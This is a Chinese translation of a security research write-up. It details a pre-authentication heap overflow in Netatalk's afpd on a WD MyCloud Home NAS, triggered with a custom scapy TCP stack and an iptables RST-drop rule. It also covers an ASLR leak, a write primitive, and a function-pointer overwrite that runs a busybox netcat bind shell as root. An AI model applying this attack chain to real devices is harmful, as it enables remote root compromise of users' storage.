> 翻译原文链接：<https://www.synacktiv.com/en/publications/exploiting-a-remote-heap-> overflow-with-a-custom-tcp-stack>
>
> 翻译主题：本篇文章主要从网络模型方面使用自定义TCP数据包结构和内核缓冲实现溢出漏洞代码执行，是一篇细节非常丰富，参考链接众多的二进制文章。

# 利用自定义TCP栈实现远程堆溢出漏洞——漏洞细节和分析

## 环境搭建：

Western Digital
MyCloudHome是一款消费级的NAS，同时具有本地网络和基于云的共享功能。在参加的比赛时的我们发现固件版本为7.15.1-101，根据资料该设备在armv8l的CPU上运行自定义的Android发行版，它具备公开的一些自定义服务，并集成了一些开源实现，在使用了Netatalk守护程序中，我们发现由于该服务是以root权限运行且可以从相邻网络访问，所以选择它作为攻击目标。我们不会在此讨论初始是如何发现的琐事，而是提供漏洞的详细分析以及我们如何利用这个漏洞。

Netatalk
[2]是苹果文件共享协议（AFP）文件服务器的免费开源[3]实现。该协议用于在网络化的macOS环境中在设备之间共享文件服务。Netatalk通过afpd服务进行分发，在许多Linux发行版和设备上也可用。因此，本文介绍的工作也适用于其他系统。其中Western
Digital对源代码进行了一些修改以适应Android环境[4]，但它们的更改对此次分析不相关，因此我们将仍然使用这个官方源代码。

这次发现的漏洞是AFP数据通过数据流接口（DSI）协议[5]传输，被利用的漏洞位于DSI层，可以在没有任何形式的身份验证的情况下访问。

## 服务器实现概述：

## DSI层

这个服务器是一个常规的进行fork的服务器，其父进程在TCP端口548上监听，并分叉出新的子进程来处理客户端会话。该协议交换不同的数据包，这些数据包由16字节的数据流接口（DSI）头封装。

    
    
    #define DSI_BLOCKSIZ 16
    struct dsi_block {
        uint8_t dsi_flags;       /* packet type: request or reply */
        uint8_t dsi_command;     /* command */
        uint16_t dsi_requestID;  /* request ID */
        union {
            uint32_t dsi_code;   /* error code */
            uint32_t dsi_doff;   /* data offset */
        } dsi_data;
        uint32_t dsi_len;        /* total data length */
        uint32_t dsi_reserved;   /* reserved field */
    };
    

这段代码定义了一个名为 "dsi_block" 的结构体，它包含了以下字段：

  1. dsi_flags: 表示数据包类型，可以是请求或回复。
  2. dsi_command: 表示命令。
  3. dsi_requestID: 表示请求的ID号。
  4. dsi_data: 一个联合体，可以表示错误码或者数据偏移量。
  5. dsi_len: 表示总长度。
  6. dsi_reserved: 保留字段。

其中，联合体 "dsi_data" 可以保存两种不同类型的值。 如果数据包类型是请求，则 "dsi_data.dsi_doff"
字段表示该请求数据在文件中的偏移量；如果数据包类型是回复，则 "dsi_data.dsi_code" 表示错误码。此外，代码中预定义了常量
"DSI_BLOCKSIZ" ，它的值为16。

一般来说，请求之后会跟随一个负载payload，其长度由dsi_len字段指定。

payload的含义取决于使用了什么dsi_command。一个会话应该以dsi_command字节设置为DSIOpenSession
(4)开始。这通常会接着使用各种DSICommand(2)来访问文件共享的更多功能。在这种情况下，负载的第一个字节是指定所请求操作的AFP命令号。

dsi_requestID是一个id，每个请求都应该是唯一的，给服务器检测重复命令的机会。如后面所述，Netatalk基于此id实现了重播缓存的功能，以避免执行两次命令。

其中值得一提的是，AFP协议支持不同的身份验证方案以及匿名连接。但这超出了本文撰写的范围，因为漏洞位于DSI层，而DSI发生在在AFP身份验证之前。

**关于服务器实现的一些注意事项**

## DSI层的数据结构

为了在子进程中管理客户端，守护进程使用一个 DSI *dsi 结构体。该结构体表示当前连接及其缓冲区，并传递给大多数 Netatalk
相关函数。以下是该结构体的定义，某些成员已被我编辑删除：

    
    
    #define DSI_DATASIZ       65536
    
    /* child and parent processes might interpret a couple of these
     * differently. */
    typedef struct DSI {
        /* ... */
        struct dsi_block        header;
        /* ... */
        uint8_t  *commands;            /* DSI receive buffer */
        uint8_t  data[DSI_DATASIZ];    /* DSI reply buffer */
        size_t   datalen, cmdlen;
        off_t    read_count, write_count;
        uint32_t flags;             /* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */
        int      socket;            /* AFP session socket */
        int      serversock;        /* listening socket */
    
        /* DSI readahead buffer used for buffered reads in dsi_peek */
        size_t   dsireadbuf;        /* size of the DSI read ahead buffer used in dsi_peek() */
        char     *buffer;           /* buffer start */
        char     *start;            /* current buffer head */
        char     *eof;              /* end of currently used buffer */
        char     *end;
    
        /* ... */
    } DSI;
    

我们可以看到这个结构体有以下几个成员：

  1. 用于接收用户输入的命令堆缓冲区，通过 dsi_init_buffer() 初始化，默认大小为1MB。
  2. cmdlen 表示输入命令的大小。
  3. 一个内联数据缓冲区，大小为64KB，用于回复。
  4. datalen 表示输出数据的大小。
  5. 由指针 buffer、start、eof、end 管理的预读堆缓冲区，默认大小为12MB，并在 dsi_init_buffer() 中初始化。

### 主循环代码执行

在接收到 DSIOpenSession 命令之后，子进程进入 afp_over_dsi()
的主循环。该函数将处理传入的命令，直到通信结束。以下是其简化代码：

    
    
    void afp_over_dsi(AFPObj *obj)
    {
        DSI *dsi = (DSI *) obj->dsi;
        /* ... */
        /* get stuck here until the end */
        while (1) {
            /* ... */
            /* Blocking read on the network socket */
            cmd = dsi_stream_receive(dsi);
            /* ... */
    
            switch(cmd) {
            case DSIFUNC_CLOSE:
                /* ... */
            case DSIFUNC_TICKLE:
                /* ...*/
            case DSIFUNC_CMD:
                /* ... */
                function = (u_char) dsi->commands[0];
                /* ... */
                err = (*afp_switch[function])(obj, dsi->commands, dsi->cmdlen, &dsi->data, &dsi->datalen);
                /* ... */
            default:
                LOG(log_info, logtype_afpd,"afp_dsi: spurious command %d", cmd);
                dsi_writeinit(dsi, dsi->data, DSI_DATASIZ);
                dsi_writeflush(dsi);
                break;
            }
        }
    

## 接收数据过程

在上一个代码片段中，我们看到空闲的服务器将在 dsi_stream_receive() 中接收客户端数据。由于缓冲尝试，该函数看起来有些繁琐。以下是
dsi_stream_receive() 中整个接收过程的概述，dsi_stream_receive(DSI* dsi) 函数：

    
    
    1. 在其堆栈中定义一个 char 类型的 block[DSI_BLOCKSIZ]，用于接收 DSI 头。
    2. dsi_buffered_stream_read(dsi, block, sizeof(block)) 等待接收 DSI 头。
       1. from_buf(dsi, block, length) 从已缓冲的输入数据（即在 dsi->start 和 dsi->end 之间的数据）中尝试获取可用数据。
       2. recv(dsi->socket, dsi->eof, buflen, 0) 尝试将最多8192个字节的数据作为缓冲尝试接收到前向缓冲区。由于套接字是非阻塞的，因此调用通常会失败。
       3. dsi_stream_read(dsi, block, len))
          1. buf_read(dsi, block, len)
             1. from_buf(dsi, block, len) 再次尝试从已缓冲的输入数据中获取数据。
             2. readt(dsi->socket, block, len, 0, 0); 在套接字上接收数据。这个调用将在一个 recv()/select() 循环中等待，通常是阻塞的。
    3. 从接收到的数据填充 &dsi->header。
    4. dsi_stream_read(dsi, dsi->commands, dsi->cmdlen)
       1. 调用 buf_read() 来获取 DSI 负载。如果没有足够的数据可用，则调用将在 select() 上等待。

这里需要注意的主要是当客户端以多个或大型命令的形式发送数据时，服务器只会在 dsi_buffered_stream_read() 的 recv()
中对其进行缓冲。并且，最多缓冲 8KB 的数据。

## 发现漏洞代码

在前面的代码片段中，我们看到在主循环中，afp_over_dsi() 可以接收一个未知的命令ID。在这种情况下，服务器会调用
dsi_writeinit(dsi, dsi->data, DSI_DATASIZ)函数，然后调用 dsi_writeflush(dsi)函数。

我们先假设这两个函数的目的是刷新输入和输出缓冲区，并在必要时清除前向缓冲区。然而，这些函数的结构看起非常奇怪，此处调用它们似乎是不正确的。更糟糕的是，我们发现了dsi_writeinit()
存在缓冲区溢出漏洞。事实上，该函数将从前向缓冲区输出字节到其第二个参数 dsi->data，而没有检查第三个参数 DSI_DATASIZ 提供的大小

    
    
    size_t dsi_writeinit(DSI *dsi, void *buf, const size_t buflen _U_)
    {
        size_t bytes = 0;
        dsi->datasize = ntohl(dsi->header.dsi_len) - dsi->header.dsi_data.dsi_doff;
    
        if (dsi->eof > dsi->start) {
            /* We have data in the buffer */
            bytes = MIN(dsi->eof - dsi->start, dsi->datasize);
            memmove(buf, dsi->start, bytes);    // potential overflow here
            dsi->start += bytes;
            dsi->datasize -= bytes;
            if (dsi->start >= dsi->eof)
                dsi->start = dsi->eof = dsi->buffer;
        }
    
        LOG(log_maxdebug, logtype_dsi, "dsi_writeinit: remaining DSI datasize: %jd", (intmax_t)dsi->datasize);
    
        return bytes;
    }
    

在上面的代码片段中，变量 dsi->header.dsi_len 和 dsi-> header.dsi_data.dsi_doff 在
dsi_stream_receive() 中被设置，并由客户端控制。因此，dsi->datasize 会受到客户端的控制，根据 MIN(dsi->eof -dsi->start, dsi->datasize)，下面的 memmove 函数，所以理论上可能会溢出 buf（这里是 dsi->data）。这可能导致
dsi 结构体尾部的破坏，因为 dsi->data 是一个内联缓冲区。

但是，有一个重要的限制是：dsi->data 的大小为64KB，我们已经看到前向缓冲区的实现将最多从 dsi_buffered_stream_read()
中读取8KB 的数据。因此，在大多数情况下，dsi->eof - dsi->start 小于 8KB，这不足以溢出 dsi->data。

幸运的是，还有一种复杂的方法可以缓冲超过 8KB 的数据并触发此溢出。后续部分将解释如何到达该点，并利用此漏洞实现代码执行。

## 漏洞触发发现：关于dsi_peek()函数

虽然接收过程并不简单，但发送过程更加令人困惑。有很多不同的函数用于向客户端发送数据，其中一个有趣的函数是 dsi_peek(DSI *dsi)。

以下是该函数的英文解释：

    
    
    /*
    afpd在尝试发送东西时睡眠时间过长
    可能没有读取器，或者读取器也处于写入休眠状态
    看看是否有一些数据可以供我们读取，希望它会唤醒读取器，这样我们就可以再次进行写入
    
    而当可以再次发送时返回0，出错时返回-1。"
     */
     static int dsi_peek(DSI *dsi)
    

换句话说，dsi_peek()
将在阻塞发送期间暂停，并在可能的情况下尝试读取一些数据。这是为了避免客户端和服务器之间潜在的死锁。好消息是接收过程存在缓冲过程的：

    
    
    static int dsi_peek(DSI *dsi)
    {
        /* ... */
    
        while (1) {
            /* ... */
            FD_ZERO(&readfds);
            FD_ZERO(&writefds);
    
            if (dsi->eof < dsi->end) {
                /* space in read buffer */
                FD_SET( dsi->socket, &readfds);
            } else { /* ... */ }
    
            FD_SET( dsi->socket, &writefds);
    
            /* No timeout: if there's nothing to read nor nothing to write,
             * we've got nothing to do at all */
            if ((ret = select( maxfd, &readfds, &writefds, NULL, NULL)) <= 0) {
                if (ret == -1 && errno == EINTR)
                    /* we might have been interrupted by out timer, so restart select */
                    continue;
                /* give up */
                LOG(log_error, logtype_dsi, "dsi_peek: unexpected select return: %d %s",
                    ret, ret < 0 ? strerror(errno) : "");
                return -1;
            }
    
            if (FD_ISSET(dsi->socket, &writefds)) {
                /* we can write again */
                LOG(log_debug, logtype_dsi, "dsi_peek: can write again");
                break;
            }
    
            /* Check if there's sth to read, hopefully reading that will unblock the client */
            if (FD_ISSET(dsi->socket, &readfds)) {
                len = dsi->end - dsi->eof; /* it's ensured above that there's space */
    
                if ((len = recv(dsi->socket, dsi->eof, len, 0)) <= 0) {
                    if (len == 0) {
                        LOG(log_error, logtype_dsi, "dsi_peek: EOF");
                        return -1;
                    }
                    LOG(log_error, logtype_dsi, "dsi_peek: read: %s", strerror(errno));
                    if (errno == EAGAIN)
                        continue;
                    return -1;
                }
                LOG(log_debug, logtype_dsi, "dsi_peek: read %d bytes", len);
    
                dsi->eof += len;
            }
        }
    

这里我们看到，如果 select() 返回 dsi->socket 可读而不可写，则会使用 dsi->eof 调用 recv()。这看起来像是将超过
64KB 的数据推入前向缓冲区以后触发漏洞的一种方法。

但仍有一个问题：如何到达 dsi_peek()函数呢？

## 到达dsi_peek()函数的方法

虽然有多种方法可以进入该函数，但我们关注了 dsi_cmdreply() 的调用路径。此函数用于回复客户端请求，这是使用大多数 AFP
命令完成的。例如，发送一个带有 DSIFUNC_CMD 和 AFP 命令 0x14 的请求将触发注销尝试，即使是未经认证的客户端也会到达以下调用栈：

    
    
    afp_over_dsi()
    dsi_cmdreply(dsi, err)
    dsi_stream_send(dsi, dsi->data, dsi->datalen);
    dsi_stream_write(dsi, block, sizeof(block), 0)
    

接下来是被执行的代码：

    
    
    ssize_t dsi_stream_write(DSI *dsi, void *data, const size_t length, int mode)
    {
    
      /* ... */
      while (written < length) {
          len = send(dsi->socket, (uint8_t *) data + written, length - written, flags);
          if (len >= 0) {
              written += len;
              continue;
          }
    
          if (errno == EINTR)
              continue;
    
          if (errno == EAGAIN || errno == EWOULDBLOCK) {
              LOG(log_debug, logtype_dsi, "dsi_stream_write: send: %s", strerror(errno));
    
              if (mode == DSI_NOWAIT && written == 0) {
                  /* DSI_NOWAIT is used by attention give up in this case. */
                  written = -1;
                  goto exit;
              }
    
              /* Try to read sth. in order to break up possible deadlock */
              if (dsi_peek(dsi) != 0) {
                  written = -1;
                  goto exit;
              }
              /* Now try writing again */
              continue;
          }
    
          /* ... */
    

在上面的代码中，我们看到为了进入 dsi_peek()，必需使得调用send()函数失败。

因此，为了将数据推入前向缓冲区，可以执行以下操作：

  1. 发送一个注销命令以到达 dsi_cmdreply。
  2. 在 dsi_stream_write() 中找到一种使 send() 调用失败的方法。
  3. 在 dsi_peek() 中找到一种使 select() 仅返回可读套接字的方法。

让远程系统在保持流打开的同时发送数据失败是很棘手的。一种有趣的方法是自定义 TCP 网络层数据包。然后总体策略是拥有一个自定义 TCP
栈，在发送注销请求后模拟网络拥塞，但仅在一个方向上。想法是远程应用程序会认为它无法再发送任何数据，而实际上还能接收一些数据。

由于涉及到许多层（网络卡层、内核缓冲区、远程 TCP 拥塞避免算法、用户堆栈使用等），要找到实现目标的最佳方式并不容易。但所选的方法是两种方法的混合使用：

  1. 将客户端的 TCP 窗口清零，让远程主机认为我们的缓冲区已满；
  2. 停止发送 ACK 包作为服务端的响应。

这种策略似乎已经足够了，漏洞利用程序在几秒钟内很快就能进入所需的代码路径。

## 如何编写自定义TCP数据包与堆栈结构

为实现所述的策略，我们需要重新实现 TCP 网络栈。因为我们不想涉及其中更低层次的细节，所以我们决定使用 scapy[6] 并在原始套接字上使用
Python 实现它。

漏洞利用程序的 RawTCP 类就是这个开发工作的结果。它的使用很基本且速度较慢，并且不能处理 TCP
的大多数特定方面（例如数据包重排序和重传）。然而，由于我们预计目标设备与我们在同一网络中且没有网络可靠性问题，因此当前的实现已足够稳定。

RawTCP 最值得注意的细节是可以将 reply_with_ack 属性设置为 0，以停止发送 ACK 和 window，用于广告当前缓冲区大小。

我们的漏洞利用的一个前提条件是攻击者的内核必须被 “关闭响应” ，以便它不会尝试解释传入的和发送意外的 TCP 字段。

实际上，Linux 的TCP 栈并不知道我们在 TCP 连接上的更改，所以他将尝试通过发送 RST 数据包来终止相关连接。

我们可以使用以下 iptables 规则防止 Linux 向目标发送 RST 数据包：

    
    
    # iptables -I OUTPUT -p tcp -d TARGET_IP --dport 548 --tcp-flags RST RST -j DROP
    

## 触发漏洞

总结一下，以下是我们如何触发此 Bug 的步骤。实现此代码的函数位于漏洞利用程序的 do_overflow 中：

通过发送 DSIOpenSession 打开一个会话。

批量发送大量带有注销功能 0x14 的 DSICommand 请求，强制服务器进入 dsi_cmdreply()。 我们测试过，3000
个命令对于目标硬件来说足够了。

通过广告 TCP 窗口大小为 0 并停止回复服务器的 ACK 响应来模拟网络拥塞。 过一段时间后，服务器应该被卡在 dsi_peek() 中，只能接收数据。

发送一个具有 dsi_len 和有效负载大于 64KB 的 DSI 虚拟和无效命令。 此命令在 dsi_peek() 中接收，稍后在
dsi_stream_receive() / dsi_stream_read() / buf_read() 中使用。 在漏洞利用程序中，我们使用
DSIFUNC_MAX+1 的命令 ID 来进入 afp_over_dsi() switch 的默认情况。

发送一个块超过 64KB 的原始数据。 这个块也在服务器被阻塞时在 dsi_peek() 中接收，但被 dsi_writeinit() 消耗掉并溢出了
dsi->data 和 dsi 结构体的尾部。

开始再次回复服务器的 ACK 响应（3000），并发送适当的 TCP 窗口大小。 这将触发之前被阻塞的注销命令的处理，然后再继续处理无效命令以引发漏洞溢出。

整个过程非常快，通常在几秒钟内完成（取决于环境设置，通常少于 15 秒）。

## 获取地址泄漏——破坏ASLR保护的方法

为了利用服务器，我们需要知道主二进制文件 (apfd) 装载在内存的哪个位置。服务器启动时启用地址空间布局随机化保护（ASLR），因此 apfd
的基地址每次启动时都会改变。幸运的是，apfd 在处理客户端连接之前进行分叉，因此即使我们崩溃了一个分叉的进程，基地址也将在所有连接中保持不变。

为了破坏 ASLR，我们需要泄漏指向 apfd 二进制文件中某个已知内存位置的指针。为了获得这个泄露内存地址，我们可以使用溢出来破坏 dsi
结构体的尾部（数据缓冲区后面）以迫使服务器发送比预期更多的数据。服务器的命令重放缓存功能提供了一种方便的方法来做到这一点。

以下是 afp_over_dsi() 的主循环的相关部分：

    
    
    // in afp_over_dsi()
        case DSIFUNC_CMD:
    
            function = (u_char) dsi->commands[0];
    
            /* AFP replay cache */
            rc_idx = dsi->clientID % REPLAYCACHE_SIZE;
            LOG(log_debug, logtype_dsi, "DSI request ID: %u", dsi->clientID);
    
            if (replaycache[rc_idx].DSIreqID == dsi->clientID
                && replaycache[rc_idx].AFPcommand == function) {
    
                LOG(log_note, logtype_afpd, "AFP Replay Cache match: id: %u / cmd: %s",
                    dsi->clientID, AfpNum2name(function));
                err = replaycache[rc_idx].result;
    
                /* AFP replay cache end */
    
            } else {
                    dsi->datalen = DSI_DATASIZ;
                    dsi->flags |= DSI_RUNNING;
                /* ... */
    
                if (afp_switch[function]) {
                    /* ... */
                    err = (*afp_switch[function])(obj,
                                                  (char *)dsi->commands, dsi->cmdlen,
                                                  (char *)&dsi->data, &dsi->datalen);
    
                    /* ... */
                    /* Add result to the AFP replay cache */
                    replaycache[rc_idx].DSIreqID = dsi->clientID;
                    replaycache[rc_idx].AFPcommand = function;
                    replaycache[rc_idx].result = err;
                }
            }
            /* ... */
            dsi_cmdreply(dsi, err)
    
            /* ... */
    

下面是 dsi_cmdreplay()函数代码：

    
    
    int dsi_cmdreply(DSI *dsi, const int err)
    {
        int ret;
    
        LOG(log_debug, logtype_dsi, "dsi_cmdreply(DSI ID: %u, len: %zd): START",
            dsi->clientID, dsi->datalen);
    
        dsi->header.dsi_flags = DSIFL_REPLY;
        dsi->header.dsi_len = htonl(dsi->datalen);
        dsi->header.dsi_data.dsi_code = htonl(err);
    
        ret = dsi_stream_send(dsi, dsi->data, dsi->datalen);
    
        LOG(log_debug, logtype_dsi, "dsi_cmdreply(DSI ID: %u, len: %zd): END",
            dsi->clientID, dsi->datalen);
    
        return ret;
    }
    

当服务器接收到相同的命令两次（相同的 clientID 和函数），它将采用重放缓存代码路径，该路径在没有初始化 dsi->datalen 的情况下调用
dsi_cmdreply()函数。因此，在这种情况下，dsi_cmdreply() 将发送 dsi_stream_send() 中的
dsi->datalen 字节的 dsi->data 回到客户端。

由于 datalen 字段位于结构体 DSI 中的数据缓冲区之后。这意味着要控制 datalen，我们只需要使用 65536 + 4 字节（4 是
size_t 的大小）来触发溢出漏洞。

然后，通过发送一个已经使用过的 clientID 的 DSICommand 命令，我们达到了一个可以发送回所有 dsi->data 缓冲区、dsi
结构体尾部和后续堆数据中一部分的 dsi_cmdreply()。在 dsi 结构体尾部，我们得到了一些堆指针，例如
dsi->buffer、dsi->start、dsi->eof、dsi->end。这很有用，因为现在我们知道了客户控制的数据存储在哪里。

在后续的堆数据中，我们希望找到指向 afpd 主映像的指针。

从我们的实验中，我们发现大多数情况下，通过请求泄漏 2MB+64KB，我们会得到由 hash_create() 函数分配的 hash_t 对象的堆部分：

    
    
    typedef struct hash_t {
        #if defined(HASH_IMPLEMENTATION) || !defined(KAZLIB_OPAQUE_DEBUG)
        struct hnode_t **hash_table;        /* 1 */
        hashcount_t hash_nchains;           /* 2 */
        hashcount_t hash_nodecount;         /* 3 */
        hashcount_t hash_maxcount;          /* 4 */
        hashcount_t hash_highmark;          /* 5 */
        hashcount_t hash_lowmark;           /* 6 */
        hash_comp_t hash_compare;           /* 7 */
        hash_fun_t hash_function;           /* 8 */
        hnode_alloc_t hash_allocnode;
        hnode_free_t hash_freenode;
        void *hash_context;
        hash_val_t hash_mask;           /* 9 */
        int hash_dynamic;               /* 10 */
        #else
        int hash_dummy;
        #endif
    } hash_t;
    
    hash_t *hash_create(hashcount_t maxcount, hash_comp_t compfun,
                        hash_fun_t hashfun)
    {
        hash_t *hash;
    
        if (hash_val_t_bit == 0)    /* 1 */
            compute_bits();
    
        hash = malloc(sizeof *hash);    /* 2 */
    
        if (hash) {     /* 3 */
            hash->table = malloc(sizeof *hash->table * INIT_SIZE);  /* 4 */
            if (hash->table) {  /* 5 */
                hash->nchains = INIT_SIZE;      /* 6 */
                hash->highmark = INIT_SIZE * 2;
                hash->lowmark = INIT_SIZE / 2;
                hash->nodecount = 0;
                hash->maxcount = maxcount;
                hash->compare = compfun ? compfun : hash_comp_default;
                hash->function = hashfun ? hashfun : hash_fun_default;
                hash->allocnode = hnode_alloc;
                hash->freenode = hnode_free;
                hash->context = NULL;
                hash->mask = INIT_MASK;
                hash->dynamic = 1;          /* 7 */
                clear_table(hash);          /* 8 */
                assert (hash_verify(hash));
                return hash;
            }
            free(hash);
        }
        return NULL;
    }
    

hash_t 结构与其他数据非常不同，其中包含指向 afpd 主映像中的 hnode_alloc() 和 hnode_free() 函数的指针。

这段C语言代码定义了一个名为hash_t的结构体，该结构体包含了多个成员变量和一个指向指针数组的指针。其中的每个成员变量都具有特定的含义和作用。

在typedef struct
hash_t之后，代码使用了条件编译的语法来定义结构体成员变量。如果定义了HASH_IMPLEMENTATION宏或者未定义KAZLIB_OPAQUE_DEBUG宏，则会定义1到10个不同的成员变量。否则，只会定义一个整型变量hash_dummy。

接下来的函数hash_create()是一个创建哈希表的函数。该函数接收三个参数：maxcount表示哈希表能够容纳的最大元素数量；compfun和hashfun分别表示哈希表中键值对的比较函数和哈希函数。该函数的返回值是一个指向hash_t类型的指针。

因此，通过解析收到的泄漏，我们可以查找 hash_t 模式并恢复主二进制文件的 ASLR 偏移量。这种方法在漏洞利用程序的 parse_leak()
函数中实现。

遗憾的是，这种策略并非 100% 可靠，取决于 afpd 的堆初始化情况。dsi 结构体后可能存在未映射的内存范围，导致在尝试发送泄漏时使守护程序崩溃。

在这种情况下，除非设备（或守护程序）重新启动，否则漏洞利用程序将无法工作。但这种情况似乎很少见（少于 20%
的情况），所以为我们漏洞利用程序提供了一定的成功机会。

## write原语编写

现在我们知道了主映像和堆位于服务器内存的位置，就可以利用漏洞的全部代码并溢出其余的结构 *DSI 以实现代码执行。

重写 dsi->proto_close
看起来是一种有潜力的方法来获取流程的控制。然而，由于缺乏对参数的控制，我们选择了另一种利用方法，它在所有架构上都同样有效，但需要能够在所选位置写入任意数据。

DSI 结构体的前向指针似乎是实现受控代码写入的良好机会。

    
    
    typedef struct DSI {
        /* ... */
        uint8_t  data[DSI_DATASIZ];
        size_t   datalen, cmdlen; /* begining of the overflow */
        off_t    read_count, write_count;
        uint32_t flags;             /* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */
        int      socket;            /* AFP session socket */
        int      serversock;        /* listening socket */
    
        /* DSI readahead buffer used for buffered reads in dsi_peek */
        size_t   dsireadbuf;        /* size of the DSI readahead buffer used in dsi_peek() */
        char     *buffer;           /* buffer start */
        char     *start;            /* current buffer head */
        char     *eof;              /* end of currently used buffer */
        char     *end;
    
        /* ... */
    } DSI;
    

通过将 dsi->buffer 设置为我们想要写入的位置，并将 dsi->end 设置为写入位置的上限，下一个被服务器缓冲的命令可能会在受控地址结束。

在设置 dsi->start 和 dsi->eof 时应注意，因为它们在 dsi_writeinit() 中溢出后会重置为 dsi->buffer。

    
    
    if (dsi->eof > dsi->start) {
        /* We have data in the buffer */
        bytes = MIN(dsi->eof - dsi->start, dsi->datasize);
        memmove(buf, dsi->start, bytes);
        dsi->start += bytes;         // the overflowed value is changed back here ...
        dsi->datasize -= bytes;
        if (dsi->start >= dsi->eof)
            dsi->start = dsi->eof = dsi->buffer; // ... and there
    }
    

如上代码片段所示，这只是在溢出期间将 dsi->start 设置为大于 dsi->eof 的值的问题。

因此，要获得一个写原语，需要执行以下操作：

  * 根据写入位置溢出 dsi->buffer、dsi->end、dsi->start 和 dsi->eof。
  * 在同一个 TCP 数据包中发送两个命令。
  * 第一个命令仅是虚拟的，第二个命令包含要写入的数据。
  * 在此处发送两个命令似乎很奇怪，但这是触发任意写入必须的，因为 dsi_stream_read() 的接收机制复杂。
  * 当接收到第一个命令时，dsi_buffered_stream_read() 将跳过非阻塞调用 recv() 并使用 dsi_stream_read() -> buf_read() -> readt() 中的阻塞接收路径。
  * 控制写入发生在接收第二个命令时。由于两个命令在同一个 TCP 数据包中发送，第二个命令的数据很可能在套接字上可用。因此，非阻塞 recv() 应该成功并在 dsi->eof 处写入。

## 命令执行过程

现在可以在所选位置写入任意数据，就可以控制远程程序了。

最明显的写入位置是数组 preauth_switch：

    
    
    static AFPCmd preauth_switch[] = {
        NULL, NULL, NULL, NULL,
        NULL, NULL, NULL, NULL,                 /*   0 -   7 */
        NULL, NULL, NULL, NULL,
        NULL, NULL, NULL, NULL,                 /*   8 -  15 */
        NULL, NULL, afp_login, afp_logincont,
        afp_logout, NULL, NULL, NULL,               /*  16 -  23 */
        NULL, NULL, NULL, NULL,
        NULL, NULL, NULL, NULL,                 /*  24 -  31 */
        NULL, NULL, NULL, NULL,
        NULL, NULL, NULL, NULL,                 /*  32 -  39 */
        NULL, NULL, NULL, NULL,
        ...
    

这个数组是某个程序中的预认证命令开关表。根据它的定义，可以看出它是一个包含了登录、注销等操作的列表。当执行预认证时，程序会使用这个数组中对应的函数来处理相应的命令。如果数组中的元素值为NULL，则表示对应的命令没有被实现或被禁用。

由于这是一个静态数组，因此它在编译时就被分配了内存空间，并且在程序运行期间不能再改变它的大小。

如先前文章所述，该数组用于在 afp_over_dsi() 中分发客户端 DSICommand
请求。通过在表中写入任意条目，然后可以使用受控函数指针执行以下调用：

    
    
    err = (*afp_switch[function])(obj,
                    (char *)dsi->commands, dsi->cmdlen,
                    (char *)&dsi->data, &dsi->datalen);
    

一个很好的替代 preauth_switch[function] 的函数是 afprun()。该函数用于启动 shell 命令，服务器甚至可以使用 root
权限执行此操作了。

    
    
    int afprun(int root, char *cmd, int *outfd)
    {
        pid_t pid;
        uid_t uid = geteuid();
        gid_t gid = getegid();
    
        /* point our stdout at the file we want output to go into */
        if (outfd && ((*outfd = setup_out_fd()) == -1)) {
            return -1;
        }
    
        /* ... */
    
        if ((pid=fork()) < 0) { /* ... */ }
    
        /* ... */
    
        /* now completely lose our privileges. This is a fairly paranoid
           way of doing it, but it does work on all systems that I know of */
        if (root) {
            become_user_permanently(0, 0);
            uid = gid = 0;
        }
        else {
            become_user_permanently(uid, gid);
        }
    
        /* ... */
    
        execl("/bin/sh","sh","-c",cmd,NULL);
        /* not reached */
        exit(82);
        return 1;
    }
    

因此，要作为 root 执行命令，我们将以下调用从

    
    
    (*afp_switch[function])(obj, dsi->commands, dsi->cmdlen, [...]);
    

跳转到：

    
    
    afprun(int root, char *cmd, int *outfd)
    

情况如下：

由客户端选择 function，使得 afp_switch[function] 是用 afprun 覆盖的函数指针； obj 是一个非 NULL 的
AFPObj _指针，与应该是非零的 root 参数相符； dsi- >commands
是一个有效的指针，其中包含可控内容，我们可以将所选命令（例如已绑定的 netcat shell）放在其中； dsi->cmdlen 必须是 NULL
或一个有效的指针，因为在 afprun 中会对 _outfd 进行解引用。

最后还有一个困难。不可能发送足够长的 dsi->command，以使 dsi->cmdlen 变成一个有效的指针。 但是，如果 dsi->cmdlen 为
NULL，则 dsi->command 将不再被控制。

关键在于观察到 dsi_stream_receive() 在客户端请求之间不清除 dsi->command，并且 afp_over_dsi() 在使用
dsi->commands[0] 之前不检查 cmdlen。

因此，如果客户端发送一个没有 dsi->command 负载和 dsi->cmdlen 为零的 DSI 数据包，则 dsi->command
会保持与先前命令相同。

因此，可以发送以下内容：

第一个 DSI 请求，dsi->command 类似于 <function_id> ; /sbin/busybox nc -lp <port> -e
/bin/sh;。 第二个 DSI 请求，dsi->cmdlen 为零。 这最终会调用：</port></function_id>

    
    
    (*afp_switch[function_id])(obj,"<function_id> ; /sbin/busybox nc -lp <PORT> -e /bin/sh;", 0, [...])
    

这就是在将 afp_switch[function_id] 覆盖为 afprun 后获取 RCE 所需的步骤。

作为最终优化，甚至可以将最后两个 DSI 数据包一起发送，以触发代码执行作为编写原语所需的最后两个命令。 这样做会同时进行 preauth_switch
的覆写和 dsi->command、dsi->cmdlen 的设置。 实际上，由于一些不值得在文中解释的细节，甚至更容易混合两者。
感兴趣的读者可以参考利用评论。

## 把所有的分析放在一起

总结一下，以下是利用过程的概述：

  1. 建立连接。
  2. 使用 4 字节溢出触发漏洞，以重写 dsi->datalen。
  3. 发送一个带有先前使用的 clientID 的命令，以触发泄露。
  4. 解析泄漏，同时查找 hash_t 结构，给出指向 afpd 主映像的指针。
  5. 关闭旧连接并建立新连接。
  6. 使用更大的溢出触发漏洞，以重写 dsi 结构的前向缓冲区指针。
  7. 发送两个请求作为一个：
    1. 第一个 DSICommand 的内容为 "<function_id> ; /sbin/busybox nc -lp <port> -e /bin/sh;"；</port></function_id>
    2. 第二个 DSICommand 的内容为 &afprun，但 dsi_len 和 dsi->cmdlen 的长度为零。
  8. 发送一个没有内容的 DSICommand 以触发命令执行。

## 文章结论

在这项研究中，我们开发了一个针对最新版本的 Netatalk 的可行利用工具。它使用单个堆溢出漏洞来绕过所有缓解措施，并以 root 用户身份执行命令。在
MyCloud Home 中，afpd 服务被配置为允许 guest 认证，但由于漏洞在认证之前就可以访问，因此即使禁用了 guest 认证，攻击也会成功。

最有趣的部分是我们实现一个自定义的 TCP 栈来触发漏洞。这对于用户空间和现实生活中而不是 CTF）的利用来说很少见，我们认为这非常有趣。

我们的利用工具=可以直接用于目标设备上。将其适配到其他发行版可能需要进行一些微调，留给读者作为练习。

